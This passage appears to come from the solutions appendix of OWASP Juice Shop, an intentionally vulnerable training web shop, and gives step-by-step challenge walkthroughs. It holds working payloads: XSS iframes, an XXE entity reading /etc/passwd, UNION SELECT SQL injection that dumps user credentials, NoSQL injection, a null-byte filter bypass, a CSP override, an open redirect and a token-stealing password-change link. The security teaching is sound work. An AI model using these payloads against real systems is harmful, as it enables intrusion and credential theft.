Starfleet symbol."_
 ** Another product review _"Fresh out of a replicator."_ on the _Green
Smoothie_ product
 ** A _Recycling Request_ associated to his saved address _"Room 3F
121, Deck 5, USS Enterprise, 1701"_
. It should eventually become obvious that _James T. Kirk_ is the only
viable solution to the question of Jim's identity
+
image::appendix/Star_Trek_William_Shatner.JPG[James T. Kirk]

. Visit https://en.wikipedia.org/wiki/James_T._Kirk and read the
https://en.wikipedia.org/wiki/James_T._Kirk#Depiction[Depiction]
section
. It tells you that Jim has a brother named _George Samuel Kirk_
. Visit http://localhost:3000/#/forgot-password and provide
`jim@juice-sh.op` as your _Email_
. In the subsequently appearing form, provide `Samuel` as _Your eldest
siblings middle name?_
. Then type any _New Password_ and matching _Repeat New Password_
. Click _Change_ to solve this challenge
+
image::appendix/jim_forgot-password.png[Password reset for Jim]

=== Upload a file larger than 100 kB

. The client-side validation prevents uploads larger than 100 kB.
. Craft a `POST` request to http://localhost:3000/file-upload with a
form parameter `file` that contains a PDF file of more than 100 kB
but less than 200 kB.
+
image::appendix/invalid-size_upload.png[Larger file upload]

. The response from the server will be a `204` with no content, but the
challenge will be successfully solved.

Files larger than 200 kB are rejected by an upload size check on server
side with a `500` error stating `Error: File too large`.

=== Upload a file that has no .pdf or .zip extension

. Craft a `POST` request to http://localhost:3000/file-upload with a
form parameter `file` that contains a non-PDF file with a size of
less than 200 kB.
+
image::appendix/invalid-type_upload.png[Non-PDF upload]

. The response from the server will be a `204` with no content, but the
challenge will be successfully solved.

Uploading a non-PDF file larger than 100 kB will solve
<<_upload_a_file_larger_than_100_kb,Upload a file larger than 100 kB>>
simultaneously.

=== Perform a persisted XSS attack bypassing a client-side security mechanism

. Submit a POST request to http://localhost:3000/api/Users with
 ** `{"email": "<iframe src=\"javascript:alert(`xss`)\">", "password":
"xss"}` as body
 ** and `application/json` as `Content-Type` header.

+
image::appendix/xss2_postman.png[XSS request in PostMan]
. Log in to the application with an admin.
. Visit http://localhost:3000/#/administration.
. An alert box with the text "xss" should appear.
+
image::appendix/xss2_alert.png[XSS alert box]

. Close this box. Notice the somewhat broken looking row in the
_Registered Users_ table?
. Click the "eye"-button in that row.
. A modal overlay dialog with the user details opens where the attack
string is rendered as harmless text.
+
image::appendix/xss2_user-modal.png[XSS user in details dialog]

=== Perform a persisted XSS attack without using the frontend application at all

. Log in to the application with any user.
. Copy your `Authorization` header from any HTTP request submitted via
browser.
. Submit a POST request to http://localhost:3000/api/Products with
 ** `{"name": "XSS", "description": "<iframe
src=\"javascript:alert(`xss`)\">", "price": 47.11}` as body,
 ** `application/json` as `Content-Type`
 ** and `Bearer ?` as `Authorization` header, replacing the `?` with
the token you copied from the browser.

+
image::appendix/xss3_postman.png[XSS request in PostMan]
. Visit http://localhost:3000/#/search.
. An alert box with the text "xss" should appear.
+
image::appendix/xss3_alert.png[XSS alert box]

. Close this box. Notice the product row which has a frame border in
the description in the _All Products_ table
. Click the "eye"-button next to that row.
. Another alert box with the text "xss" should appear. After closing it
the actual details dialog pops up showing the same frame border.
+
image::appendix/xss3_product-modal_alert.png[After closing the XSS alert box in product details]

=== Retrieve the content of C:\Windows\system.ini or /etc/passwd from the server

. Solve the
<<_use_a_deprecated_b2b_interface_that_was_not_properly_shut_down,Use a deprecated B2B interface that was not properly shut down>>
challenge.
. Prepare an XML file which defines and uses an external entity
`<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>` (or `<!ENTITY xxe
SYSTEM "file:///C:/Windows/system.ini" >]>` on Windows).
. Upload this file through the _File Complaint_ dialog and observe the
Javascript console while doing so. It should give you an error
message containing the parsed XML, including the contents of the
local system file!

== ⭐⭐⭐⭐ Challenges

=== Gain access to any access log file of the server

. Solve the
<<_access_a_confidential_document,Access a confidential document>> or
any related challenges which will bring the exposed `/ftp` folder to
your attention.
. Visit http://localhost:3000/ftp and notice the file
`incident-support.kdbx` which is needed for
xref:../part2/security-misconfiguration.adoc#_log_in_with_the_support_teams_original_user_credentials[Log in with the support team's original user credentials]
and indicates that some support team is performing its duties from
the public Internet and possibly with VPN access.
. Guess luckily or run a brute force attack with e.g.
https://github.com/zaproxy/zap-extensions/tree/beta/src/org/zaproxy/zap/extension/bruteforce[OWASP ZAPs DirBuster plugin]
for a possibly exposed directory containing the log files.
. Following
xref:../part2/sensitive-data-exposure.adoc#_gain_access_to_any_access_log_file_of_the_server[the hint to drill down deeper than one level],
you will at some point end up with
http://localhost:3000/support/logs.
. Inside you will find at least one `access.log` of the current day.
Open or download it to solve this challenge.
+
image::appendix/access-log_folder.png[Exposed folder containing access logs]

=== Bypass the Content Security Policy and perform an XSS attack on a legacy page

. Log in as any user.
. Visit our user profile page at http://localhost:3000/profile.
. Type in any _Username_ and click the _Set Username_ button.
. Notice that the username is displayed beneath the profile image.
. Change the username into `<script>alert(`xss`)</script>` and click
_Set Username_.
. Notice the displayed username under the profile picture now is
`lert(`xss`)` while in the _Username_ field it shows
`lert(`xss`)</script>` - both a clear indication that the malicious
input was sanitized. Obviously the sanitization was not very
sophisticated, as the input was quite mangled and even the closing
`<script>` tag survived the procedure.
. Change the username into `<<a|ascript>alert(`xss`)</script>` and
click _Set Username_.
. The naive sanitizer only removes `<a|a` effectively changing the
username into `<script>alert(`xss`)</script>` but you'll notice
that the script is still not executed!
. The username shows as `\` on the screen and the
`<script>alert(`xss`)</script>` is part of the DOM. It seems that
its execution was blocked by the Content Security Policy (CSP) of the
page.
. Bypassing the CSP requires to exploit a totally different attack
vector on the profile page: The _Image URL_ field.
. Set the _Image URL_ to some valid image URL, e.g.
https://placekitten.com/300/300 and click _Link Image_ while
inspecting the network traffic via your browser's DevTools.
. Notice how the `Content-Security-Policy` response header has been
changed in the subsequent call to http://localhost:3000/profile?
It now contains an entry like
`/assets/public/images/uploads/17.jpg;`, which is the location of
the successfully uploaded image.
. Try setting the _Image URL_ again, but now to some invalid image
URL, e.g. http://definitely.not.an/image.png. While the linking
fails and your profile will show a broken image, the CSP header will
now contain `+http://definitely.not.an/image.png;+` - the originally
supplied URL.
. This influence on the CSP header - plus the fact that the first
encountered entry in case of duplicates always wins - is fatal for
the application. We can basically overwrite the CSP with one of our
own choosing.
. Set `+https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval'
https://code.getmdl.io http://ajax.googleapis.com+` as _Image URL_
and click _Link Image.
. Refresh the page to give the browser the chance to load the tampered
CSP and enjoy the alert box popping up!

=== Order the Christmas special offer of 2014

. Open http://localhost:3000/#/search and reload the page with `F5`
while observing the _Network_ tab in your browser's DevTools
. Recognize the `GET` request
http://localhost:3000/rest/products/search?q= which returns the
product data.
. Submitting any SQL payloads via the _Search_ field in the navigation
bar will do you no good, as it is only applying filters onto the
entire data set what was retrieved with a singular call upon loading
the page.
. In that light, the `q=` parameter on the
http://localhost:3000/rest/products/search endpoint would not even
be needed, but might be a relic from a different implementation of
the search functionality. Test this theory by submitting
http://localhost:3000/rest/products/search?q=orange which should
give you a result such as
+
image::appendix/search-result_orange.png[JSON search result for "orange" keyword]

. Submit `';` as `q` via
http://localhost:3000/rest/products/search?q=';
. You will receive an error page with a `SQLITE_ERROR: syntax error`
mentioned, indicating that SQL Injection is indeed possible.
+
image::appendix/search-error_sql-syntax.png[SQL search query syntax error]

. You are now in the area of Blind SQL Injection, where trying create
valid queries is a matter of patience, observance and a bit of luck.
. Varying the payload into `'--` for `q` results in a `SQLITE_ERROR:
incomplete input`. This error happens due to two (now unbalanced)
parenthesis in the query.
. Using `'))--` for `q` fixes the syntax and successfully retrieves all
products, including the (logically deleted) Christmas offer. Take
note of its `id` (which should be `10`)
+
image::appendix/search-result_christmas.png[JSON search result with the Christmas special]

. Go to http://localhost:3000/#/login and log in as any user.
. Add any regularly available product into you shopping basket to
prevent problems at checkout later. Memorize your `BasketId` value
in the request payload (when viewing the Network tab) or find the
same information in the `bid` variable in your browser's Session
Storage (in the Application tab).
. Craft and send a `POST` request to
http://localhost:3000/api/BasketItems with
 ** `{"BasketId": "<Your Basket ID>", "ProductId": 10, "quantity": 1}`
as body
 ** and `application/json` as `Content-Type`
. Go to http://localhost:3000/#/basket to verify that the "Christmas
Super-Surprise-Box (2014 Edition)" is in the basket
. Click _Checkout_ on the _Your Basket_ page to solve the challenge.

==== Alternative path without any SQL Injection

This solution involves a lot less hacking & sophistication but requires
more attention & a good portion of shrewdness.

. Retrieve all products as JSON by calling
http://localhost:3000/rest/products/search?q=
. Write down all ``id``s that are _missing_ in the otherwise sequential
numeric range
. Perform step 12. and 13. from above solution for all those missing
``id``s
. Once you hit the "Christmas Super-Surprise-Box (2014 Edition)" click
_Checkout_ for instant success!

=== Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous

. Solve
<<_order_the_christmas_special_offer_of_2014,Order the Christmas special offer of 2014>>
but enumerate all deleted products until you come across "Rippertuer
Special Juice"
. Notice the warning _"This item has been made unavailable because of
lack of safety standards."_ in its description, indicating that this
is the product you need to investigate for this challenge
. Further notice the partial list of ingredients in the description
namely _"Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora,
Bael Aegle marmelos... and others"_
. Submitting either or all of the above ingredients at
http://localhost:3000/#/contact will *not* solve this challenge -
it must be some unlisted ingredients that create a dangerous
combination.
. A simple Google search for `Cherymoya Annona cherimola Jabuticaba
Myrciaria cauliflora Bael Aegle marmelos` should bring up several
results, one of them being a blog post "Top 20 Fruits You Probably
Don't Know" from 2011. Visit this post at
https://listverse.com/2011/07/08/top-20-fruits-you-probably-dont-know
. Scrolling through the list of replies you will notice
https://listverse.com/2011/07/08/top-20-fruits-you-probably-dont-know/#comment-4541753139[a particular comment from user _Localhorst_]
saying _"Awesome, some of these fruits also made it into our
"Rippertuer Special Juice"! https://pastebin.com/90dUgd7s"_
. Visit https://pastebin.com/90dUgd7s to find a PasteBin paste titled
"Rippertuer Special Juice Ingredients" containing a JSON document
with many exotic fruits in it, each with its name as `type` and a
detailed `description`
. When carefully reading all fruit descriptions you will notice a
warning on the `Hueteroneel` fruit that _"this coupled with Eurogium
Edule was sometimes found fatal"_
+
image::appendix/rippertuer-ingredients.png[Ingredients list of "Rippertuer Special Juice"]

. As `Eurogium Edule` is also on the very same list of ingredients,
these two must be the ones you are looking for
. Submit a comment containing both `Eurogium Edule` and `Hueteroneel`
via http://localhost:3000/#/contact to solve this challenge

=== Find the hidden easter egg

ROT13 ("rotate by 13 places", sometimes hyphenated ROT-13) is a simple
letter substitution cipher that replaces a letter with the letter 13
letters after it in the alphabet. ROT13 is a special case of the
Caesar cipher, developed in ancient Rome.

Because there are 26 letters (2×13) in the basic Latin alphabet, ROT13
is its own inverse; that is, to undo ROT13, the same algorithm is
applied, so the same action can be used for encoding and decoding. The
algorithm provides virtually no cryptographic security, and is often
cited as a canonical example of weak encryption.footnote:1[https://en.wikipedia.org/wiki/ROT13]

=== Successfully redeem an expired campaign coupon code

. Open `main.js` in your Browser's dev tools and search for
`campaign`.
+
image::appendix/minified_js-campaigncode.png[Campaign code in minified JavaScript]

. You will find a `this.campaigns` assignment of an object containing
various campaign codes. Depending on when you are reading this book,
one or more of these might be expired. Let's continue with the oldest
available one, which is `WMNSDY2019`.
. A bit further down in the minified code you will notice a function
`applyCoupon()` that uses `this.campaigns` and in particular the
contained `validOn` timestamp of a coupon.
. Ignoring that validity check and just submitting `WMNSDY2019` will
yield an `Invalid Coupon.` error, as you would expect. This is
because of the second part of the assertion `this.clientDate ===
e.validOn`.
. Converting `validOn: 15519996e5` of the `WMNSDY2019` coupon into a
JavaScript date will tell you that this campaign was active on March
8th 2019 only: Women's Day!
. Set the time of your computer to March 8th 2019 and try to submit the
code again.
. This time it will be accepted! Proceed to _Checkout_ to get the
challenge solved.

=== Access a developer's forgotten backup file

. Browse to http://localhost:3000/ftp (like in
<<_access_a_confidential_document,Access a confidential document>>.
. Opening http://localhost:3000/ftp/package.json.bak directly will
fail complaining about an illegal file type.
. Using a _Poison Null Byte_ (`%00`) the filter can be tricked, but
only with a twist:
 ** Accessing http://localhost:3000/ftp/package.json.bak%00.adoc will
surprisingly *not* succeed...
 ** ...because the `%` character needs to be URL-encoded (into `%25`)
as well in order to work its magic later during the file system
access.
. http://localhost:3000/ftp/package.json.bak%2500.adoc will ultimately
solve the challenge.

=== Log in with Bjoern's Gmail account

. Bjoern has registered via Google OAuth with his (real) account
link:mailto:bjoern.kimminich@googlemail.com[bjoern.kimminich@googlemail.com].
. Cracking his password hash will probably not work.
. To find out how the OAuth registration and login work, inspect the
`main.js` and search for `oauth`, which will eventually reveal
a function `userService.oauthLogin()`.
+
image::appendix/minified_js-oauth.png[oauthLogin function in main.js]

. In the function body you will notice a call to `userService.save()` -
which is used to create a user account in the non-Google _User
Registration_ process - followed by a call to the regular
`userService.login()`
. The `save()` and `login()` function calls both leak how the password
for the account is set: `password:
btoa(n.email.split("").reverse().join(""))`
. Some Internet search will reveal that `window.btoa()` is a default
function to encode strings into Base64.
. What is passed into `btoa()` is `email.split("").reverse().join("")`,
which is simply the email address string reversed.
. Now all you have to do is Base64-encode `moc.liamg@hcinimmik.nreojb`,
so you can log in directly with _Email_ `bjoern.kimminich@gmail.com`
and _Password_ `bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=`.

=== Steal someone else's personal data without using Injection

. Log in as any user, put some items into your basket and create an
order from these.
. Notice that you end up on a URL with a seemingly generated random part, like http://localhost:3000/#/order-completion/5267-829f123593e9d098
. On that _Order Summary_ page, click on the _Track Orders_ link under the _Thank you for your purchase!_ message to end up on a URL simular to http://localhost:3000/#/track-result/new?id=5267-829f123593e9d098
. Open the network tab of your browser's DevTools and refresh that page. You should notice a request similar
to http://localhost:3000/rest/track-order/5267-829f123593e9d098.
. Inspecting the response closely, you might notice that the user email
address is partially obfuscated:
`+{"status":"success","data":[{"orderId":"5267-829f123593e9d098","email":"*dm*n@j**c*-sh.*p","totalPrice":2.88,"products":[{"quantity":1,"name":"Apple
Juice
(1000ml)","price":1.99,"total":1.99,"bonus":0},{"quantity":1,"name":"Apple
Pomace","price":0.89,"total":0.89,"bonus":0}],"bonus":0,"eta":"2","_id":"tosmfPsDaWcEnzRr3"}]}+`
. It looks like certain letters - seemingly all vowels - were replaced
with `*` characters before the order was stored in the database.
. Register a new user with an email address that would result in _the
exact same_ obfuscated email address. For example register
`edmin@juice-sh.op` to steal the data of `admin@juice-sh.op`.
. Log in with your new user and immediately get your data exported via
http://localhost:3000/#/privacy-security/data-export.
. You will notice that the order belonging to the existing user
`admin@juice-sh.op` (in this example `5267-829f123593e9d098`) is part
of your new user's data export due to the clash when obfuscating
emails!

=== Access a misplaced SIEM signature file

. Use the _Poison Null Byte_ attack described in
<<_access_a_developers_forgotten_backup_file,Access a developer's forgotten backup file>>...
. ...to download
http://localhost:3000/ftp/suspicious_errors.yml%2500.adoc

=== Let the server sleep for some time

. You can interact with the backend API for product reviews via the
dedicated endpoints `/rest/products/reviews` and
`+/rest/products/{id}/reviews+`
. Get the reviews of the product with database ID 1:
http://localhost:3000/rest/products/1/reviews
. Inject a
https://docs.mongodb.com/manual/reference/method/sleep/[`sleep(integer ms)` command]
by changing the URL into
http://localhost:3000/rest/products/sleep(2000)/reviews to solve the
challenge

To avoid _real_ Denial-of-Service (DoS) issues, the Juice Shop will only
wait for a maximum of 2 seconds, so
http://localhost:3000/rest/products/sleep(999999)/reviews should not
take longer than http://localhost:3000/rest/products/sleep(2000)/reviews
to respond.

=== Update multiple product reviews at the same time

. Log in as any user to get your `Authorization` token from any
subsequent request's headers.
. Submit a PATCH request to http://localhost:3000/rest/products/reviews
with
 ** `{ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }` as body
 ** `application/json` as `Content-Type` header.
 ** and `Bearer ?` as `Authorization` header, replacing the `?` with
the token you received in step 1.

+
image::appendix/nosql_multiple-reviews-updated.png[Multiple review updated via NoSQL Injection]
. Check different product detail dialogs to verify that _all review
texts_ have been changed into `NoSQL Injection!`

=== Enforce a redirect to a page you are not supposed to redirect to

. Pick one of the redirect links in the application, e.g.
http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop
from the _GitHub_-button in the navigation bar.
. Trying to redirect to some unrecognized URL fails due to allowlist
validation with `406 Error: Unrecognized target URL for redirect`.
. Removing the `to` parameter (http://localhost:3000/redirect) will
instead yield a `500 TypeError: Cannot read property 'indexOf' of
undefined` where the `indexOf` indicates a severe flaw in the way the
allowlist works.
. Craft a redirect URL so that the target-URL in `to` comes with an own
parameter containing a URL from the allowlist, e.g.
http://localhost:3000/redirect?to=http://kimminich.de?pwned=https://github.com/juice-shop/juice-shop

=== Bypass a security control with a Poison Null Byte

=== Reset Bender's password via the Forgot Password mechanism

. Trying to find out who "Bender" might be should _immediately_ lead
you to _Bender from http://www.imdb.com/title/tt0149460/[Futurama]_
as the only viable option
+
image::appendix/Bender_Rodriguez.png[Bender]

. Visit https://en.wikipedia.org/wiki/Bender_(Futurama) and read the
_Character Biography_ section
. It tells you that Bender had a job at the metalworking factory,
bending steel girders for the construction of _suicide booths_.
. Find out more on _Suicide Booths_ on
http://futurama.wikia.com/wiki/Suicide_booth
. This site tells you that their most important brand is _Stop'n'Drop_
. Visit http://localhost:3000/#/forgot-password and provide
`bender@juice-sh.op` as your _Email_
. In the subsequently appearing form, provide `Stop'n'Drop` as _Company
you first work for as an adult?_
. Then type any _New Password_ and matching _Repeat New Password_
. Click _Change_ to solve this challenge

=== Reset Uvogin's password via the Forgot Password mechanism

. To reset Uvogin's password, you need the to find out what his
favorite movie is in order to answer his security question. This is
the kind of information that people often carelessly expose online.
. People often tend to reuse aliases on different websites.
https://github.com/sherlock-project/sherlock[Sherlock] is a great
tool for finding social media accounts with known aliases/pesudonyms.
. Unfortunately, plugging _uvogin_ into sherlock yields nothing of
interest. Reading the reviews left by uvogin on the various products,
one can notice that they have quite an affinity for _leetspeak_
. Trying out a few variations of the alias uvogin, _uv0gin_ leads us to
a twitter account with a similarly written tweet which references a
vulnerable beverage store. However nothing about his favorite movie
+
image::appendix/uvogin_twitter.png[Uvogin's Twitter]

. The https://archive.org/web/[WayBack] can be used to check for
older versions of their profile page to look for deleted tweets. And
indeed, one of the snapshots available on WayBack contains a deleted
tweet that references `Silence of the Lambs` which is infact the
correct answer to his security question
+

=== Rat out a notorious character hiding in plain sight in the shop

. Looking for irregularities among the image files you will at some
point notice that `5.png` is the only PNG file among otherwise only
JPGs in the customer feedback carousel:
+
image::appendix/steganography.png[Steganography customer support image]

. Running this image through some decoders available online will
probably just return garbage, e.g.
http://stylesuxx.github.io/steganography/ gives you `+ÿÁÿm¶Û$ÿ
?HÕPü^ÛN'c±UY;fäHÜmÉ#r<v¸+` or
https://www.mobilefish.com/services/steganography/steganography.php
gives up with `No hidden message or file found in the image`. On
https://incoherency.co.uk/image-steganography/#unhide you will also
find nothing independent of how you set the _Hidden bits_ slider:
+
image::appendix/steganography_failed-unhide.png[Steganography unhiding fails]

. Moving on to client applications you might end up with
https://www.openstego.com/[OpenStego] which is built in Java but
also offers a Windows installer at
https://github.com/syvaidya/openstego/releases.
. Selecting the `5.png` and clicking _Extract Data_ OpenStego will
quickly claim to have been successful:
+
image::appendix/steganography_openstego-success.png[Steganography exctraction successful]

. The image that will be put into the _Output Stego file_ location

matter) to solve this challenge.

=== Inform the shop about a typosquatting trick it has been a victim of

. Solve the
<<_access_a_developers_forgotten_backup_file,Access a developer's forgotten backup file>>
challenge and open the `package.json.bak` file
. Scrutinizing each entry in the `dependencies` list you will at some
point get to `epilogue-js`, the overview page of which gives away
that you find the culprit at
https://www.npmjs.com/package/epilogue-js
+
image::appendix/npm_epilogue-js.png[epilogue-js on NPM]

. Visit http://localhost:3000/#/contact
. Submit your feedback with `epilogue-js` in the comment to solve this
challenge

You can probably imagine that the typosquatted `epilogue-js` would be _a
lot harder_ to distinguish from the original repository `epilogue`, if
it where not marked with the _THIS IS *NOT* THE MODULE YOU ARE LOOKING
FOR!_-warning at the very top. Below you can see the original `epilogue`
NPM page:

image::appendix/npm_epilogue.png[epilogue on NPM]

=== Retrieve a list of all user credentials via SQL Injection

. During the
<<_order_the_christmas_special_offer_of_2014,Order the Christmas special offer of 2014>>
challenge you learned that the `/rest/products/search` endpoint is
susceptible to SQL Injection into the `q` parameter.
. The attack payload you need to craft is a `UNION SELECT` merging the
data from the user's DB table into the products returned in the JSON
result.
. As a starting point we use the known working `'))--` attack pattern
and try to make a `UNION SELECT` out of it
. Searching for `')) UNION SELECT * FROM x--` fails with a
`SQLITE_ERROR: no such table: x` as you would expect. But we can
easily guess the table name or infer it from one of the previous
attacks on the _Login_ form where even the underlying SQL query was
leaked.
. Searching for `')) UNION SELECT * FROM Users--` fails with a
promising `SQLITE_ERROR: SELECTs to the left and right of UNION do
not have the same number of result columns` which least confirms the
table name.
. The next step in a `UNION SELECT`-attack is typically to find the
right number of returned columns. As the _Search Results_ table in
the UI has 3 columns displaying data, it will probably at least be
three. You keep adding columns until no more `SQLITE_ERROR` occurs
(or at least it becomes a different one):
 .. `')) UNION SELECT '1' FROM Users--` fails with `number of result
columns` error
 .. `')) UNION SELECT '1', '2' FROM Users--` fails with `number of
result columns` error
 .. `')) UNION SELECT '1', '2', '3' FROM Users--` fails with `number
of result columns` error
 .. (...)
 .. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
Users--` _still fails_ with `number of result columns` error
 .. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM
Users--` finally gives you a JSON response back with an extra
element
`{"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"}`.
. Next you get rid of the unwanted product results changing the query
into something like `qwert')) UNION SELECT '1', '2', '3', '4', '5',
'6', '7', '8', '9' FROM Users--` leaving only the "``UNION``ed" element
in the result set
. The last step is to replace the fixed values with correct column
names. You could guess those *or* derive them from the RESTful API
results *or* remember them from previously seen SQL errors while
attacking the _Login_ form.
. Searching for `qwert')) UNION SELECT id, email, password, '4', '5',
'6', '7', '8', '9' FROM Users--` solves the challenge giving you a
the list of all user data in convenient JSON format.
+
image::appendix/union_select-attack_result.png[User list from UNION SELECT attack]

There is of course a much easier way to retrieve a list of all users as
long as you are logged in: Open http://localhost:3000/#/administration
while monitoring the HTTP calls in your browser's developer tools. The
response to http://localhost:3000/rest/user/authentication-details
also contains the user data in JSON format. But: This list has all the
password hashes replaced with `*`-symbols, so it does not count as a
solution for this challenge.

=== Inform the shop about a vulnerable library it is using

Juice Shop depends on a JavaScript library with known vulnerabilities.
Having the `package.json.bak` and using an online vulnerability database
like https://retirejs.github.io/[Retire.js] or a CLI tool like
https://docs.npmjs.com/cli/audit/[npm-audit] that comes with Node.js, makes it rather easy to identify it.

. Solve
xref:../part2/sensitive-data-exposure.adoc#_access_a_developers_forgotten_backup_file[Access a developer's forgotten backup file]
. Checking the dependencies in `package.json.bak` for known
vulnerabilities online will give you a match (at least) for
 ** `sanitize-html`: Sanitization of HTML strings is not applied
recursively to input, allowing an attacker to potentially inject
script and other markup (see
https://github.com/advisories/GHSA-3j7m-hmh3-9jmp)
 ** `express-jwt`: Inherits a JWT verification bypass and other
vulnerabilities from its dependencies (see
https://github.com/advisories/GHSA-c7hr-j4mj-j2w6)
. Visit http://localhost:3000/#/contact
 .. Submit your feedback with the string pair `sanitize-html` and
`1.4.2` appearing somewhere in the comment. Alternatively you can
submit `express-jwt` and `0.1.3`.

=== Perform a persisted XSS attack bypassing a server-side security mechanism

In the `package.json.bak` you might have noticed the pinned dependency
`"sanitize-html": "1.4.2"`. Internet research will yield a reported
https://github.com/advisories/GHSA-3j7m-hmh3-9jmp[Cross-site Scripting (XSS)]
vulnerability, which was fixed with version 1.4.3 - one release later
than used by the Juice Shop. The referenced
https://github.com/apostrophecms/sanitize-html/issues/29[GitHub issue]
explains the problem and gives an exploit example:

____
Sanitization is not applied recursively, leading to a vulnerability to
certain masking attacks. Example:

`I am not harmless: <<img src="csrf-attack"/>img src="csrf-attack"/>`
is sanitized to `I am not harmless: <img src="csrf-attack"/>`

Mitigation: Run sanitization recursively until the input html matches
the output html.
____

. Visit http://localhost:3000/#/contact.
. Enter `<<script>Foo</script>iframe src="javascript:alert(`xss`)">` as
_Comment_
. Choose a rating and click _Submit_
. Visit http://localhost:3000/#/about for a first "xss" alert (from the
_Customer Feedback_ slideshow)

. Visit http://localhost:3000/#/administration for a second "xss" alert
(from the _Customer Feedback_ table)
+
image::appendix/xss4_alert-admin.png[XSS alert box in admin area]

=== Perform a persisted XSS attack through an HTTP header

. Log in as any user.
. Visit http://localhost:3000/#/privacy-security/last-login-ip where
your _IP Address_ probably shows as `0.0.0.0`.
+
image::appendix/normal_lastLoginIp.png[Normal Last Login IP address]

. Log out and then log in again with the same user as before.
. Visit http://localhost:3000/#/privacy-security/last-login-ip again
where your _IP Address_ should now show your actual remote IP address
(or `127.0.0.1` if you run the application locally).
. Find the request to https://localhost:3000/rest/saveLoginIp in your
Browser DevTools.
. Replay the request after adding the `X-Forwarded-For` HTTP header to
spoof an arbitrary IP, e.g. `1.2.3.4`.
. Unfortunately in the response (and also on
http://localhost:3000/#/privacy-security/last-login-ip after
logging in again) you will still find your remote IP as before
. Repeat step 6. only with the proprietary header `True-Client-IP`.
. In the JSON response you will notice `lastLoginIp: "1.2.3.4"` and
after logging in again you will see `1.2.3.4` as your _IP Address_ on
http://localhost:3000/#/privacy-security/last-login-ip.
. Replay the request once more with `True-Client-IP: <iframe
src="javascript:alert(``xss``)">` to solve this seriously obscure
challenge.
. Log in again and visit
http://localhost:3000/#/privacy-security/last-login-ip see the
alert popup.
+

== ⭐⭐⭐⭐⭐ Challenges

=== Learn about the Token Sale before its official announcement

. Open the `main.js` in your browser's developer tools and
search for some keywords like "ico", "token", "bitcoin" or "altcoin".
. Note the names of the JavaScript functions where these occur in, like
`Vu()` and `Hu(l)`. These names are obfuscated, so they might be
different for you.
+
image::appendix/minified_js-tokensale.png[Obfuscated token sale related functions in main.js]

. Searching for references to those functions in `main.js` might
yield some more functions, like `zu(l)` and some possible route name
`app-token-sale`
+
image::appendix/minified_js-tokensale_trail.png[More token sale related functions in main.js]

. Navigate to http://localhost:3000/#/app-token-sale or variations
like http://localhost:3000/#/token-sale just to realize that these
routes do not exist.
. After some more chasing through the minified code, you should realize
that `Vu` is referenced in the route mappings that already helped
with
<<_find_the_carefully_hidden_score_board_page,Find the carefully hidden 'Score Board' page>>
and
<<_access_the_administration_section_of_the_store,Access the administration section of the store>>
but not to a static title. It is mapped to another variable `Ca`
(which might be named differently for you)
+
image::appendix/minified_js-tokensale_route.png[Tokensale route mapping in main.js]

. Search for `function Ca(` to find the declaration of the function
that should return a matcher to the route name you are looking for.
+
image::appendix/minified_js-tokensale_matcher.png[Tokensale route matcher in main.js]

. Copy the obfuscating function into the JavaScript console of your
browser and execute it immediately by appending a `()`. This will
probably yield a `Uncaught SyntaxError: Unexpected token )`. When you
pass values in, like `(1)` or `('a')` you will notice that the input
value is simply returned.
. Comparing the route mapping to others shows you that here a `matcher`
is mapped to a `component` whereas most other mappings map a `path`
to their `component`.
. The code that gives you the sought-after path is the code block
passed into the `match()` function inside `Ca(l)`!
+
image::appendix/minified_js-tokensale_path-block.png[Code block returning the Tokensale path]

. Copying that inner code block and executing that in your console
will still yield an error!
. You need to append it to a string to make it work, which will
*finally* yield the path `/tokensale-ico-ea`.
. Navigate to http://localhost:3000/#/tokensale-ico-ea to solve this
challenge.

=== Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password

. Log in as anyone.
. Inspecting the backend HTTP calls of the _Password Change_ form
reveals that these happen via `HTTP GET` and submits current and new
password in clear text.
. Probe the responses of `/rest/user/change-password` on various
inputs:
 ** http://localhost:3000/rest/user/change-password?current=A yields
a `401` error saying `Password cannot be empty.`
 ** http://localhost:3000/rest/user/change-password?current=A&new=B
yields a `401` error saying `New and repeated password do not
match.`
 ** http://localhost:3000/rest/user/change-password?current=A&new=B&repeat=C
also says `New and repeated password do not match.`
 ** http://localhost:3000/rest/user/change-password?current=A&new=B&repeat=B
says `Current password is not correct.`
 ** http://localhost:3000/rest/user/change-password?new=B&repeat=B
yields a `200` success returning the updated user as JSON!
. Now
<<_log_in_with_benders_user_account,Log in with Bender's user account>>
using SQL Injection.
. Craft a GET request with Bender's `Authorization Bearer` header to
http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic
to solve the challenge.

==== Bonus Round: Delivering the attack via reflected XSS

If you want to craft an actually realistic attack against
`/rest/user/change-password` that you could send a user as a malicious
link, you will have to invest a bit extra work, because a simple attack
like _Search_ for `+<img
src="http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic">+`
will not work. Making someone click on the corresponding attack link
http://localhost:3000/#/search?q=%3Cimg%20src%3D%22http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%22%3E
will return a `500` error when loading the image URL with a message
clearly stating that your attack ran against a security-wall: `Error:
Blocked illegal activity`

To make this exploit work, some more sophisticated attack URL is
required:

http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E

Pretty-printed this attack is easier to understand:

[,html]
----
